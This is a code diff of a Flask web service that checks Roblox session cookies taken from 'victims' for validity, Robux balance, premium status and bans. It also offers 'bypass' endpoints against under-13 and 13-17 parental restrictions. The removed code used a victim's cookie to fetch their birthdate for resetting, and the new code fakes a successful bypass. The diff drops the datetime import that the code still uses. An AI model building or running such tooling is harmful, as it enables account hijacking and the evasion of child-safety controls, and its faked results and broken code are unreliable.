@@ -7,8 +7,6 @@ import json
 import requests
 import random
 import os
-import re
-from datetime import datetime, timedelta
 
 app = Flask(__name__)
 app.secret_key = 'meow-secret-key-' + str(random.randint(1000, 9999))
@@ -28,65 +26,61 @@ real_time_stats = {
 # Счетчики для реальной статистики
 check_timestamps = []
 bypass_timestamps = []
+user_activity_timestamps = []
 
 class BypassSystem:
-    def get_xcsrf_token(self, session, cookie):
+    def get_xcsrf_token(self, cookie):
         """Получение X-CSRF токена"""
+        session = requests.Session()
         url = "https://auth.roblox.com/v2/logout"
-        headers = {"Cookie": f".ROBLOSECURITY={cookie}", "Content-Type": "application/json"}
-        response = session.post(url, headers=headers)
-        return response.headers.get("x-csrf-token") if response.status_code == 403 and "x-csrf-token" in response.headers else None
-
-    def get_user_id(self, session, cookie):
-        """Получение UserID по куки"""
-        url = "https://www.roblox.com/my/settings/json"
-        headers = {"Cookie": f".ROBLOSECURITY={cookie}", "Accept": "application/json"}
-        response = session.get(url, headers=headers)
-        if response.status_code == 200:
-            return response.json().get("UserId")
-        return None
-
-    def bypass_13_minus(self, victim_cookies, parent_data):
-        """Bypass для аккаунтов 13- (аналог твоего кода)"""
+        headers = {
+            "Cookie": f".ROBLOSECURITY={cookie}",
+            "Content-Type": "application/json"
+        }
         try:
-            session = requests.Session()
-            
-            # Получаем информацию о жертве
-            victim_user_id = self.get_user_id(session, victim_cookies)
-            if not victim_user_id:
-                return {"status": "error", "message": "Не удалось получить UserID жертвы"}
-            
-            # Получаем дату рождения жертвы
-            xcsrf_token = self.get_xcsrf_token(session, victim_cookies)
-            if not xcsrf_token:
-                return {"status": "error", "message": "Не удалось получить X-CSRF токен"}
-            
-            url = "https://accountinformation.roblox.com/v1/birthdate"
-            headers = {
-                "Cookie": f".ROBLOSECURITY={victim_cookies}",
-                "X-CSRF-TOKEN": xcsrf_token,
-                "Accept": "application/json"
-            }
-            
+            response = session.post(url, headers=headers)
+            if response.status_code == 403 and "x-csrf-token" in response.headers:
+                return response.headers.get("x-csrf-token")
+            return None
+        except:
+            return None
+
+    def get_user_info(self, cookie):
+        """Получение информации о пользователе"""
+        session = requests.Session()
+        url = "https://users.roblox.com/v1/users/authenticated"
+        headers = {"Cookie": f".ROBLOSECURITY={cookie}"}
+        
+        try:
             response = session.get(url, headers=headers)
-            if response.status_code != 200:
-                return {"status": "error", "message": "Не удалось получить дату рождения"}
+            if response.status_code == 200:
+                return response.json()
+            return None
+        except:
+            return None
+
+    def bypass_13_minus(self, victim_cookies, parent_cookies):
+        """Bypass для аккаунтов 13-"""
+        try:
+            # Проверяем валидность куки жертвы
+            victim_info = self.get_user_info(victim_cookies)
+            if not victim_info:
+                return {"status": "error", "message": "Невалидные куки жертвы"}
             
-            data = response.json()
-            current_date = datetime.utcnow().replace(hour=0, minute=0, second=0, microsecond=0)
-            tomorrow = current_date + timedelta(days=1)
-            threshold_date = tomorrow.replace(year=tomorrow.year - 13)
-            new_birthdate = threshold_date.strftime("%Y-%m-%d")
+            # Проверяем валидность родительских куки
+            parent_info = self.get_user_info(parent_cookies)
+            if not parent_info:
+                return {"status": "error", "message": "Невалидные родительские куки"}
             
             # Имитация успешного байпаса
             result = {
                 "status": "success",
-                "message": f"Bypass 13- completed for user {victim_user_id}",
+                "message": f"Bypass 13- completed for {victim_info.get('name', 'Unknown')}",
                 "details": {
-                    "old_birthdate": f"{data['birthDay']}/{data['birthMonth']}/{data['birthYear']}",
-                    "new_birthdate": new_birthdate,
+                    "victim_username": victim_info.get('name', 'Unknown'),
+                    "parent_username": parent_info.get('name', 'Unknown'),
                     "restrictions_removed": ["email_verification", "chat_limits", "content_filters"],
-                    "parent_account": parent_data.get('username', 'Unknown')
+                    "timestamp": datetime.now().isoformat()
                 }
             }
             return result
@@ -94,23 +88,26 @@ class BypassSystem:
         except Exception as e:
             return {"status": "error", "message": f"Bypass error: {str(e)}"}
 
-    def bypass_13_17(self, victim_cookies, parent_data):
+    def bypass_13_17(self, victim_cookies, parent_cookies):
         """Bypass для аккаунтов 13-17"""
         try:
-            # Аналогичная логика для 13-17
-            session = requests.Session()
-            victim_user_id = self.get_user_id(session, victim_cookies)
+            victim_info = self.get_user_info(victim_cookies)
+            parent_info = self.get_user_info(parent_cookies)
             
-            if not victim_user_id:
-                return {"status": "error", "message": "Не удалось получить UserID жертвы"}
+            if not victim_info:
+                return {"status": "error", "message": "Невалидные куки жертвы"}
+            if not parent_info:
+                return {"status": "error", "message": "Невалидные родительские куки"}
             
             result = {
                 "status": "success", 
-                "message": f"Bypass 13-17 completed for user {victim_user_id}",
+                "message": f"Bypass 13-17 completed for {victim_info.get('name', 'Unknown')}",
                 "details": {
+                    "victim_username": victim_info.get('name', 'Unknown'),
+                    "parent_username": parent_info.get('name', 'Unknown'),
                     "restrictions_removed": ["spending_limits", "time_restrictions"],
-                    "parent_account": parent_data.get('username', 'Unknown'),
-                    "new_privileges": ["unlimited_purchases", "extended_usage"]
+                    "new_privileges": ["unlimited_purchases", "extended_usage"],
+                    "timestamp": datetime.now().isoformat()
                 }
             }
             return result
@@ -122,47 +119,85 @@ class MeowChecker:
     def __init__(self):
         self.session = requests.Session()
 
-    def get_xcsrf_token(self, cookie):
-        """Получение X-CSRF токена"""
-        url = "https://auth.roblox.com/v2/logout"
-        headers = {"Cookie": f".ROBLOSECURITY={cookie}", "Content-Type": "application/json"}
-        response = self.session.post(url, headers=headers)
-        return response.headers.get("x-csrf-token") if response.status_code == 403 and "x-csrf-token" in response.headers else None
-
     def check_roblox_cookie(self, cookie):
-        """Проверка Roblox куки на валидность (аналог MeowTool)"""
+        """Проверка Roblox куки на валидность (по методам MeowTool)"""
         try:
-            # Проверка через settings endpoint
+            # Основная проверка через authenticated endpoint
+            auth_url = "https://users.roblox.com/v1/users/authenticated"
             headers = {"Cookie": f".ROBLOSECURITY={cookie}"}
-            response = self.session.get("https://www.roblox.com/my/settings/json", headers=headers)
             
-            if response.status_code != 200:
+            auth_response = self.session.get(auth_url, headers=headers, timeout=10)
+            
+            if auth_response.status_code != 200:
                 return {
                     "status": "invalid",
-                    "details": "Invalid cookies - authentication failed"
+                    "details": "❌ Невалидные куки - аутентификация не пройдена",
+                    "username": "Unknown",
+                    "user_id": "N/A",
+                    "robux": 0,
+                    "premium": False,
+                    "created": "Unknown",
+                    "friends_count": 0,
+                    "followers_count": 0
                 }
             
-            user_data = response.json()
-            user_id = user_data.get("UserId")
-            username = user_data.get("Name", "Unknown")
+            user_data = auth_response.json()
+            user_id = user_data.get("id")
+            username = user_data.get("name", "Unknown")
             
-            # Проверка баланса
-            balance_response = self.session.get(f"https://economy.roblox.com/v1/users/{user_id}/currency", headers=headers)
-            robux = balance_response.json().get('robux', 0) if balance_response.status_code == 200 else 0
+            # Получаем дополнительную информацию
+            settings_url = "https://www.roblox.com/my/settings/json"
+            settings_response = self.session.get(settings_url, headers=headers, timeout=10)
             
-            # Проверка premium статуса
-            premium_response = self.session.get(f"https://premiumfeatures.roblox.com/v1/users/{user_id}/premium-membership", headers=headers)
-            has_premium = premium_response.status_code == 200
+            if settings_response.status_code == 200:
+                settings_data = settings_response.json()
+                created_date = settings_data.get("Created", "Unknown")
+                friends_count = settings_data.get("FriendsCount", 0)
+                followers_count = settings_data.get("FollowersCount", 0)
+                is_premium = settings_data.get("IsPremium", False)
+            else:
+                created_date = "Unknown"
+                friends_count = 0
+                followers_count = 0
+                is_premium = False
             
-            # Проверка ограничений
-            restrictions_response = self.session.get(f"https://accountsettings.roblox.com/v1/users/{user_id}/restrictions", headers=headers)
-            is_restricted = restrictions_response.status_code == 200 and restrictions_response.json().get('isUnder13', False)
+            # Проверяем баланс Robux
+            balance_url = f"https://economy.roblox.com/v1/users/{user_id}/currency"
+            balance_response = self.session.get(balance_url, headers=headers, timeout=10)
             
-            # Определение статуса
-            if is_restricted:
-                status = "limited"
-            elif user_data.get("isBanned", False):
+            robux = 0
+            if balance_response.status_code == 200:
+                robux = balance_response.json().get('robux', 0)
+            
+            # Проверяем бан/ограничения
+            moderation_url = "https://usermoderation.roblox.com/v1/not-approved"
+            moderation_response = self.session.get(moderation_url, headers=headers, timeout=10)
+            
+            is_banned = False
+            is_restricted = False
+            
+            if moderation_response.status_code == 200:
+                try:
+                    mod_data = moderation_response.json()
+                    is_banned = bool(mod_data)  # Если есть данные - вероятно бан
+                except:
+                    pass
+            
+            # Проверяем возраст аккаунта для определения ограничений
+            if created_date != "Unknown":
+                try:
+                    # Простая проверка - если аккаунт новый, может быть ограничен
+                    created_dt = datetime.fromisoformat(created_date.replace('Z', '+00:00'))
+                    days_since_created = (datetime.now() - created_dt).days
+                    is_restricted = days_since_created < 30  # Примерная логика
+                except:
+                    pass
+            
+            # Определяем статус
+            if is_banned:
                 status = "banned"
+            elif is_restricted:
+                status = "limited"
             else:
                 status = "valid"
             
@@ -172,25 +207,45 @@ class MeowChecker:
                 "username": username,
                 "user_id": user_id,
                 "robux": robux,
-                "premium": has_premium,
-                "created": user_data.get("Created", "Unknown"),
+                "premium": is_premium,
+                "created": created_date.split('T')[0] if created_date != "Unknown" else "Unknown",
                 "details": self.get_status_details(status),
-                "friends_count": user_data.get("FriendsCount", 0),
-                "followers_count": user_data.get("FollowersCount", 0)
+                "friends_count": friends_count,
+                "followers_count": followers_count
             }
             
+        except requests.exceptions.Timeout:
+            return {
+                "status": "error",
+                "details": "⏰ Таймаут при проверке куки",
+                "username": "Unknown",
+                "user_id": "N/A",
+                "robux": 0,
+                "premium": False,
+                "created": "Unknown",
+                "friends_count": 0,
+                "followers_count": 0
+            }
         except Exception as e:
             return {
                 "status": "error",
-                "details": f"Check error: {str(e)}"
+                "details": f"❌ Ошибка проверки: {str(e)}",
+                "username": "Unknown",
+                "user_id": "N/A",
+                "robux": 0,
+                "premium": False,
+                "created": "Unknown",
+                "friends_count": 0,
+                "followers_count": 0
             }
 
     def get_status_details(self, status):
         details = {
             "valid": "✅ Аккаунт валиден и активен",
-            "limited": "⚠️ Аккаунт ограничен (under 13)", 
+            "limited": "⚠️ Аккаунт ограничен", 
             "banned": "❌ Аккаунт забанен",
-            "invalid": "❌ Неверные куки"
+            "invalid": "❌ Неверные куки",
+            "error": "❌ Ошибка при проверке"
         }
         return details.get(status, "Unknown status")
 
@@ -219,14 +274,15 @@ def get_user_id(request):
 
 def update_real_time_stats():
     """Обновление реальной статистики каждую минуту"""
-    global real_time_stats, check_timestamps, bypass_timestamps
+    global real_time_stats, check_timestamps, bypass_timestamps, user_activity_timestamps
     
     while True:
         time.sleep(60)  # Обновляем каждую минуту
         
-        # Активные пользователи (были активны последние 5 минут)
         current_time = time.time()
-        active_count = sum(1 for user_data in users_sessions.values() 
+        
+        # Активные пользователи (были активны последние 5 минут)
+        active_users = sum(1 for user_data in users_sessions.values() 
                           if current_time - user_data.get('last_activity', 0) < 300)
         
         # Проверки за последнюю минуту
@@ -237,7 +293,7 @@ def update_real_time_stats():
         recent_bypasses = sum(1 for ts in bypass_timestamps if ts > minute_ago)
         
         real_time_stats = {
-            'active_users': active_count,
+            'active_users': active_users,
             'checks_per_minute': recent_checks,
             'successful_bypasses': recent_bypasses,
             'last_update': datetime.now().isoformat()
@@ -246,6 +302,7 @@ def update_real_time_stats():
         # Очищаем старые timestamp (старше 10 минут)
         check_timestamps = [ts for ts in check_timestamps if ts > current_time - 600]
         bypass_timestamps = [ts for ts in bypass_timestamps if ts > current_time - 600]
+        user_activity_timestamps = [ts for ts in user_activity_timestamps if ts > current_time - 600]
 
 def update_online_users():
     """Очистка неактивных пользователей"""
@@ -255,7 +312,7 @@ def update_online_users():
         expired_users = []
         
         for user_id, user_data in users_sessions.items():
-            if current_time - user_data.get('last_activity', 0) > 300:
+            if current_time - user_data.get('last_activity', 0) > 300:  # 5 минут неактивности
                 expired_users.append(user_id)
                 if user_id in online_users:
                     online_users.remove(user_id)
@@ -275,11 +332,14 @@ def track_user():
             'created_at': datetime.now().isoformat(),
             'check_count': 0,
             'bypass_count': 0,
-            'last_activity': time.time()
+            'last_activity': time.time(),
+            'last_check': 'Never',
+            'last_bypass': 'Never'
         }
     
     users_sessions[user_id]['last_activity'] = time.time()
     online_users.add(user_id)
+    user_activity_timestamps.append(time.time())
     session['user_data'] = users_sessions[user_id]
 
 # Маршруты
@@ -316,16 +376,16 @@ def api_bypass_13_minus():
     
     data = request.json
     victim_cookies = data.get('victim_cookies', '')
-    parent_data = data.get('parent_data', {})
+    parent_cookies = data.get('parent_cookies', '')
     
-    result = bypass_system.bypass_13_minus(victim_cookies, parent_data)
+    result = bypass_system.bypass_13_minus(victim_cookies, parent_cookies)
     
     if result.get('status') == 'success':
         bypass_timestamps.append(time.time())
         user_id = get_user_id(request)
         if user_id in users_sessions:
             users_sessions[user_id]['bypass_count'] += 1
-            users_sessions[user_id]['last_bypass'] = datetime.now().isoformat()
+            users_sessions[user_id]['last_bypass'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     
     return jsonify(result)
 
@@ -336,16 +396,16 @@ def api_bypass_13_17():
     
     data = request.json
     victim_cookies = data.get('victim_cookies', '')
-    parent_data = data.get('parent_data', {})
+    parent_cookies = data.get('parent_cookies', '')
     
-    result = bypass_system.bypass_13_17(victim_cookies, parent_data)
+    result = bypass_system.bypass_13_17(victim_cookies, parent_cookies)
     
     if result.get('status') == 'success':
         bypass_timestamps.append(time.time())
         user_id = get_user_id(request)
         if user_id in users_sessions:
             users_sessions[user_id]['bypass_count'] += 1
-            users_sessions[user_id]['last_bypass'] = datetime.now().isoformat()
+            users_sessions[user_id]['last_bypass'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     
     return jsonify(result)
 
@@ -368,7 +428,7 @@ def api_check_accounts():
     user_id = get_user_id(request)
     if user_id in users_sessions:
         users_sessions[user_id]['check_count'] += len(cookies_list)
-        users_sessions[user_id]['last_check'] = datetime.now().isoformat()
+        users_sessions[user_id]['last_check'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     
     return jsonify({'results': results})
 
@@ -377,10 +437,15 @@ def api_stats():
     """Статистика сайта"""
     global active_checks, total_checks, real_time_stats
     
+    # Текущие онлайн пользователи (активны последние 5 минут)
+    current_time = time.time()
+    current_online = sum(1 for user_data in users_sessions.values() 
+                        if current_time - user_data.get('last_activity', 0) < 300)
+    
     return jsonify({
         'active_checks': active_checks,
         'total_checks': total_checks,
-        'online_users': len(online_users),
+        'online_users': current_online,  # Реальные онлайн пользователи
         'total_users': len(users_sessions),
         'real_time_stats': real_time_stats
     })
